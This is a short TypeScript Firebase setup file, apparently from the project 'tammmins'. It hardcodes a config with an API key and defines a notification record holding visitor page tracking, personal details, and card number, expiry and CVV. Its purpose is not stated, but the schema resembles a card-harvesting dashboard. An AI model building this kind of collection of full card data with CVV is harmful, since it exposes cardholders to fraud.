import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyCQn0MPJnD0M0k_amk-7AIfZZX2QOZVcVY",
  authDomain: "tammmins.firebaseapp.com",
  projectId: "tammmins",
  storageBucket: "tammmins.firebasestorage.app",
  messagingSenderId: "1033000678273",
  appId: "1:1033000678273:web:cfc409772c149ec715ae80",
  measurementId: "G-0FM0XX66TK"
}

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}



